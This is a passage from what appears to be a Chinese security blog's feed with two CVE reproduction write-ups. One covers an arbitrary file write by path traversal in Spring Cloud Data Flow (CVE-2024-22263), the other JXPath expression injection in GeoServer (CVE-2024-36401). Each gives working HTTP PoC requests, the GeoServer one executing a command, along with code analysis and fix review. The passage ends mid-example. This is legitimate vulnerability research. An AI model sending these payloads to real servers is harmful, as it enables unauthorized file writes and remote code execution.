      <link href="/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/"/>
      <url>/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="springcloud-dataflow任意文件写入（CVE-2024-22263）"><a href="#springcloud-dataflow任意文件写入（CVE-2024-22263）" class="headerlink" title="springcloud dataflow任意文件写入（CVE-2024-22263）"></a>springcloud dataflow任意文件写入（CVE-2024-22263）</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a href="https://spring.io/security/cve-2024-22263">https://spring.io/security/cve-2024-22263</a><br><strong>披露时间</strong>： 2024.5.23<br><strong>分析时间</strong>：2024.6.18<br><strong>github源码</strong>：<a href="https://github.com/spring-cloud/spring-cloud-dataflow">https://github.com/spring-cloud/spring-cloud-dataflow</a><br><strong>github 修复 commit</strong> ：<a href="https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31">Improved validateUploadRequest and applied after tmp directory was cr… · spring-cloud/spring-cloud-dataflow@2ac9bfa</a><br><strong>分析版本</strong>：2.11.2<br><strong>其余信息</strong>：分析时候暂无公开poc</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网查看docker-compose 的搭建方式，修改镜像版本<br>在原本的yaml中修改<br>向skipper-server服务中添加远程调式端口<br>设置jvm启动变量JDK_JAVA_OPTIONS ，添加远程调式<br>由于默认版本是jdk11所以添加：</p><pre class="language-none"><code class="language-none">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8453</code></pre><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">dataflow-server</span><span class="token punctuation">:</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">image</span><span class="token punctuation">:</span> springcloud/spring<span class="token punctuation">-</span>cloud<span class="token punctuation">-</span>dataflow<span class="token punctuation">-</span>server<span class="token punctuation">:</span>$<span class="token punctuation">{</span>DATAFLOW_VERSION<span class="token punctuation">:</span><span class="token punctuation">-</span>2.11.2<span class="token punctuation">-</span>SNAPSHOT<span class="token punctuation">}</span>$<span class="token punctuation">{</span>BP_JVM_VERSION<span class="token punctuation">:</span><span class="token punctuation">-</span><span class="token punctuation">}</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> dataflow<span class="token punctuation">-</span>server    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"9393:9393"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> LANG=en_US.utf8      <span class="token punctuation">-</span> LC_ALL=en_US.utf8      <span class="token punctuation">-</span> JDK_JAVA_OPTIONS=<span class="token punctuation">-</span>Dfile.encoding=UTF<span class="token punctuation">-</span>8 <span class="token punctuation">-</span>Dsun.jnu.encoding=UTF<span class="token punctuation">-</span><span class="token number">8</span>      <span class="token comment"># Set CLOSECONTEXTENABLED=true to ensure that the CRT launcher is closed.</span>      <span class="token punctuation">-</span> SPRING_CLOUD_DATAFLOW_APPLICATIONPROPERTIES_TASK_SPRING_CLOUD_TASK_CLOSECONTEXTENABLED=true      <span class="token punctuation">-</span> SPRING_CLOUD_SKIPPER_CLIENT_SERVER_URI=$<span class="token punctuation">{</span>SKIPPER_URI<span class="token punctuation">:</span><span class="token punctuation">-</span>http<span class="token punctuation">:</span>//skipper<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">7577</span><span class="token punctuation">}</span>/api      <span class="token comment"># (Optionally) authenticate the default Docker Hub access for the App Metadata access.</span>      <span class="token punctuation">-</span> SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRY_CONFIGURATIONS_DEFAULT_USER=$<span class="token punctuation">{</span>METADATA_DEFAULT_DOCKERHUB_USER<span class="token punctuation">}</span>      <span class="token punctuation">-</span> SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRY_CONFIGURATIONS_DEFAULT_SECRET=$<span class="token punctuation">{</span>METADATA_DEFAULT_DOCKERHUB_PASSWORD<span class="token punctuation">}</span>      <span class="token punctuation">-</span> SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRYCONFIGURATIONS_DEFAULT_USER=$<span class="token punctuation">{</span>METADATA_DEFAULT_DOCKERHUB_USER<span class="token punctuation">}</span>      <span class="token punctuation">-</span> SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRYCONFIGURATIONS_DEFAULT_SECRET=$<span class="token punctuation">{</span>METADATA_DEFAULT_DOCKERHUB_PASSWORD<span class="token punctuation">}</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> skipper<span class="token punctuation">-</span>server    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> $<span class="token punctuation">{</span>HOST_MOUNT_PATH<span class="token punctuation">:</span><span class="token punctuation">-</span>.<span class="token punctuation">}</span><span class="token punctuation">:</span>$<span class="token punctuation">{</span>DOCKER_MOUNT_PATH<span class="token punctuation">:</span><span class="token punctuation">-</span>/home/cnb/scdf<span class="token punctuation">}</span>  <span class="token key atrule">app-import-stream</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> springcloud/baseimage<span class="token punctuation">:</span>1.0.4    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> dataflow<span class="token punctuation">-</span>app<span class="token punctuation">-</span>import<span class="token punctuation">-</span>stream    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> dataflow<span class="token punctuation">-</span>server  <span class="token key atrule">app-import-task</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> springcloud/baseimage<span class="token punctuation">:</span>1.0.4    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> dataflow<span class="token punctuation">-</span>app<span class="token punctuation">-</span>import<span class="token punctuation">-</span>task    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> dataflow<span class="token punctuation">-</span>server    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">&gt;</span><span class="token scalar string">      /bin/sh -c "        ./wait-for-it.sh -t 360 dataflow-server:9393;        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps' --no-check-certificate --post-data='uri=${TASK_APPS_URI:-https://dataflow.spring.io/task-maven-latest&amp;force=true}';        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps/timestamp3' --no-check-certificate --post-data='bootVersion=3&amp;uri=maven://uri=maven:io.spring:timestamp-task:3.0.0';        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps/timestamp-batch3' --no-check-certificate --post-data='bootVersion=3&amp;uri=maven://uri=maven:io.spring:timestamp-batch:3.0.0';        echo 'Maven Task apps imported'"</span>  <span class="token key atrule">skipper-server</span><span class="token punctuation">:</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">image</span><span class="token punctuation">:</span> springcloud/spring<span class="token punctuation">-</span>cloud<span class="token punctuation">-</span>skipper<span class="token punctuation">-</span>server<span class="token punctuation">:</span>$<span class="token punctuation">{</span>SKIPPER_VERSION<span class="token punctuation">:</span><span class="token punctuation">-</span>2.11.2<span class="token punctuation">-</span>SNAPSHOT<span class="token punctuation">}</span>$<span class="token punctuation">{</span>BP_JVM_VERSION<span class="token punctuation">:</span><span class="token punctuation">-</span><span class="token punctuation">}</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> skipper<span class="token punctuation">-</span>server    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"7577:7577"</span>      <span class="token punctuation">-</span> <span class="token string">"8453:8453"</span>      <span class="token punctuation">-</span> $<span class="token punctuation">{</span>APPS_PORT_RANGE<span class="token punctuation">:</span><span class="token punctuation">-</span>20000<span class="token punctuation">-</span>20195<span class="token punctuation">:</span>20000<span class="token punctuation">-</span><span class="token number">20195</span><span class="token punctuation">}</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> LANG=en_US.utf8      <span class="token punctuation">-</span> LC_ALL=en_US.utf8      <span class="token punctuation">-</span> JDK_JAVA_OPTIONS=<span class="token punctuation">-</span>Dfile.encoding=UTF<span class="token punctuation">-</span>8 <span class="token punctuation">-</span>Dsun.jnu.encoding=UTF<span class="token punctuation">-</span>8 <span class="token punctuation">-</span>agentlib<span class="token punctuation">:</span>jdwp=transport=dt_socket<span class="token punctuation">,</span>server=y<span class="token punctuation">,</span>suspend=n<span class="token punctuation">,</span>address=<span class="token important">*:</span><span class="token number">8453</span>      <span class="token punctuation">-</span> SERVER_PORT=7577      <span class="token punctuation">-</span> SPRING_CLOUD_SKIPPER_SERVER_PLATFORM_LOCAL_ACCOUNTS_DEFAULT_PORTRANGE_LOW=20000      <span class="token punctuation">-</span> SPRING_CLOUD_SKIPPER_SERVER_PLATFORM_LOCAL_ACCOUNTS_DEFAULT_PORTRANGE_HIGH=20190      <span class="token punctuation">-</span> LOGGING_LEVEL_ORG_SPRINGFRAMEWORK_CLOUD_SKIPPER_SERVER_DEPLOYER=ERROR        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> $<span class="token punctuation">{</span>HOST_MOUNT_PATH<span class="token punctuation">:</span><span class="token punctuation">-</span>.<span class="token punctuation">}</span><span class="token punctuation">:</span>$<span class="token punctuation">{</span>DOCKER_MOUNT_PATH<span class="token punctuation">:</span><span class="token punctuation">-</span>/home/cnb/scdf<span class="token punctuation">}</span></code></pre><img src="/img/24-7-12/1.png">启动：docker-compse up -d<img src="/img/24-7-12/2.png">漏洞通告上已经说明是skipper-server那么访问7577端口<img src="/img/24-7-12/3.png">## 漏洞分析根据commit 定位到spring-cloud-skipper\spring-cloud-skipper-server-core\src\main\java\org\springframework\cloud\skipper\server\service\PackageService.java### poc<pre class="language-none"><code class="language-none">POST /api/package/upload HTTP/1.1Host: 192.168.88.65:7577Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0Content-Type: application/jsonAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Content-Length: 190{  "name": "../../../yyjccc",  "repoName": "local",  "version": "1.0.0",  "extension": "zip",  "packageFileAsBytes": [80,75,3,4,20,0,0,0,0,0,200,187,210,88,142,142,69,37,15,0,0,0,15,0,0,0,8,0,0,0,116,101,115,116,46,116,120,116,116,104,105,115,32,119,101,98,115,104,101,108,108,13,10,80,75,1,2,20,0,20,0,0,0,0,0,200,187,210,88,142,142,69,37,15,0,0,0,15,0,0,0,8,0,0,0,0,0,0,0,1,0,32,0,0,0,0,0,0,0,116,101,115,116,46,116,120,116,80,75,5,6,0,0,0,0,1,0,1,0,54,0,0,0,53,0,0,0,0,0]}</code></pre>### 分析过程定位到upload函数<img src="/img/24-7-12/4.png">找到调用的接口：/api/package/upload<img src="/img/24-7-12/5.png">请求参数UploadRequest，默认使用jackson，也就是说是json格式的数据<img src="/img/24-7-12/6.png">那么文件内容就应该是byte数组（ascii码的数组） 编写脚本读取文件<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">file_to_byte_array</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            byte_array <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>            <span class="token keyword">return</span> byte_array    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error reading file: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">byte_array_to_json</span><span class="token punctuation">(</span>byte_array<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>byte_array<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error converting to JSON: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> <span class="token string">'test.zip'</span>  <span class="token comment"># 替换为你要读取的文件路径</span>    byte_array <span class="token operator">=</span> file_to_byte_array<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> byte_array <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        byte_json <span class="token operator">=</span> byte_array_to_json<span class="token punctuation">(</span>byte_array<span class="token punctuation">)</span>        <span class="token keyword">if</span> byte_json <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>byte_json<span class="token punctuation">)</span></code></pre>跟进validateUploadRequest方法<img src="/img/24-7-12/7.png">可知所有属性都不能为空，且版本vesion要满足规范，extension只能是zip,也就是说上传的文件数据必须是zip格式的跟进getRepositoryToUpload方法<img src="/img/24-7-12/8.png">这里必须能够获取到Repository查看/api/repositories<img src="/img/24-7-12/9.png">默认有一个名为local的存储库<p>接下来继续分析</p><pre class="language-java" data-language="java"><code class="language-java">packageDirPath <span class="token operator">=</span> <span class="token class-name">TempFileUtils</span><span class="token punctuation">.</span><span class="token function">createTempDirectory</span><span class="token punctuation">(</span><span class="token string">"skipperUpload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">File</span> packageDir <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>packageDirPath <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>packageDir<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Path</span> packageFile <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>packageDir<span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-"</span><span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">isTrue</span><span class="token punctuation">(</span>packageDir<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Package directory doesn't exist."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>packageFile<span class="token punctuation">,</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getPackageFileAsBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ZipUtil</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>packageFile<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> packageDir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> unzippedPath <span class="token operator">=</span> packageDir<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> uploadRequest<span class="token punctuation">.</span><span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">File</span> unpackagedFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>unzippedPath<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>首先会创建临时目录<br><img src="/img/24-7-12/10.png"><br>然后再将临时目录与name拼接，作为临时文件上传目录。<br>漏洞点就出现在这里，如果name中有../等进行目录遍历，那么就可以设置任意的目录为上传目录<br><img src="/img/24-7-12/11.png"><br>然后与name,version与extension相加然后得到要写入数据的文件的完整路径（name拼接了两次）<br><img src="/img/24-7-12/12.png"><br>然后解压到上传目录<br>最后还拼接得到（这里加上了-version），再检查是否存在<br><img src="/img/24-7-12/13.png"><br>也就是说会异常<br>走到finally代码块<br><img src="/img/24-7-12/14.png"><br>会删除临时目录，原本正常的请求，由于上一级目录删除了，上传的文件就删除了，但通过目录遍历，上传目录已经不是临时目录中的子目录了，所以不会删除<br>最终效果：<br><img src="/img/24-7-12/15.png"><br><img src="/img/24-7-12/16.png"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>springboot fat 从任意文件写入到RCE<br>或者是写ssh公钥（物理机环境）<br>写计划任务反弹shell</p><h2 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h2><p><a href="https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31">https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31</a></p><p>主要修改<br><img src="/img/24-7-12/17.png"><br>packageDirPath.toFile().getCanonicalPath() 是Java中的用于获取文件路径的规范路径。规范路径是指消除路径中的冗余部分（如..和.）之后的路径。<br>如：若packageDirPath 为 /tmp/upload/../../yyjccc<br>则packageDirPath.toFile().getCanonicalPath() 为 /yyjccc<br>然后再判断上传目录是否以临时目录开头，若进行了目录遍历（像上面临时目录为/tmp/upload，目标目录为/yyjccc）就会抛出异常，就无法继续下去，因此也是修复了漏洞</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> springcloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeoServer表达式注入代码执行漏洞</title>
      <link href="/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="GeoServer表达式注入代码执行漏洞"><a href="#GeoServer表达式注入代码执行漏洞" class="headerlink" title="GeoServer表达式注入代码执行漏洞"></a>GeoServer表达式注入代码执行漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a href="https://avd.aliyun.com/detail?id=AVD-2024-36401">https://avd.aliyun.com/detail?id=AVD-2024-36401</a><br><strong>披露时间</strong>： 2024.7.2<br><strong>github源码</strong>：<a href="https://github.com/geoserver/geoserver">https://github.com/geoserver/geoserver</a><br><strong>分析版本</strong>：2.25.0<br><strong>漏洞版本</strong>：<br>2.25.0 &lt;= GeoServer &lt; 2.25.2<br>2.24.0 &lt;= GeoServer &lt; 2.24.4<br>GeoServer &lt; 2.23.6</p><p>阐述：GeoServer由于GeoTool组件使用了含有漏洞的commons-jxpath组件导致表达式注入漏洞<br>相关信息：<br>漏洞通告：<a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：<a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：<a href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p><p>前置知识：<br>JXPath表达式注入<br>可参考：<a href="https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7">https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载war包：<a href="https://sourceforge.net/projects/geoserver/files">https://sourceforge.net/projects/geoserver/files</a><br>手动部署到Tomcat中，然后开启tomcat远程调试</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>bat jpda start</code></pre><p>下载源码开启远程调式</p><p>然后用poc跑一下，发现是用参数控制路由的，逆向看看:</p><p>geoserver虽然使用了spring，但还是在OWS模块定义了Dispatcher总的控制器<br><img src="/img/24-7-8/8.png"></p><p>因此控制的流程还得看这个类<br>以下载的war包为例子,web.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- single mapping to spring, this only works properly if the advanced dispatch filter is active --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span></code></pre><p>在handleRequestInternal方法中可以看到是通过请求查找服务的<br><img src="/img/24-7-8/9.png"><br>sevice方法中，如果请求方法是post方法，就会解析请求体的xml数据，然后你拿到对应的服务<br>接着在handleRequestInternal方法中分发对应的方法,再进行调用<br><img src="/img/24-7-8/10.png"></p><img src="/img/24-7-8/11.png">## 漏洞分析根据漏洞公告：未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS 执行请求利用此漏洞。<p>由于GeoServer 调用的 GeoTools 库存在问题，GeoTools存在Jxpath漏洞的利用，然后Geoserver又能通过发送OGC请求去调用到存在漏洞的触发点</p><p>根据GeoTool的漏洞通告：<br>通过以下方法将 XPath 表达式传递到 commons-jxpath 库，该库可以执行任意代码，并且如果 XPath 表达式由用户输入提供，则会出现安全问题（geotool组件的问题）。</p><ul><li>org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</li><li>org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</li><li>org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</li><li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<t>)</t></li><li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</li><li>org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {…}.get(Object, String, Class<t>)</t></li><li>org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</li></ul><p>Geoserver的漏洞通告中直接给出了可能存在的漏洞请求，以及请求方法如下</p><ul><li>WFS GetFeature</li><li>WFS GetPropertyValue</li><li>WMS GetMap</li><li>WMS GetFeatureInfo</li><li>WMS GetLegendGraphic</li><li>WPS Execute</li></ul><p>Web Feature Service （WFS）是开放地理空间联盟（OGC）创建的一个标准，用于在互联网上使用HTTP创建、修改和交换矢量格式的地理信息。WFS以地理标记语言（GML）编码和传输信息，GML是XML的一个子集。<br><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br>以上是Geoserver对于wfs的介绍，其实就可以理解为一个协议，能够访问通过http访问地理信息的协议，然后该协议在不同版本有许多操作</p><h3 id="GetPropertyValue"><a href="#GetPropertyValue" class="headerlink" title="GetPropertyValue"></a>GetPropertyValue</h3><p>我们需要利用的就是存在于2.0.0版本的GetPropertyValue操作<br>从数据存储中为使用查询表达式标识的一组功能检索功能属性的值或复杂功能属性的部分值<br>从描述就可以发现他是通过表达式语言查询对应的Property属性，这里具体指的就是特定地理特征类型（如地图中的河流、建筑物等）的描述信息，包括其属性和其他特性的定义。</p><p>接着直接就在官网的文档找到了WFS GetPropertyValue的样例<br><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br><img src="/img/24-7-8/12.png"><br>然后构造请求修改一下valueReference参数的值就能成功RCE<br>实际情况命名空间需要自己获取<br>获取api:直接访问：/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage<br>即可<br><img src="/img/24-7-8/13.png"><br>可能有些需要认证，哪个能用用哪个<br>下面是几个默认的（实际中不一定有）：</p><ul><li>sf:archsites</li></ul><p>示例poc:</p><pre class="language-none"><code class="language-none">POST /geoserver/wfs HTTP/1.1Host: 127.0.0.1:7878Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/xmlContent-Length: 356&lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;  &lt;wfs:Query typeNames='sf:archsites'/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),'calc')&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;</code></pre><p>等价的get请求</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token 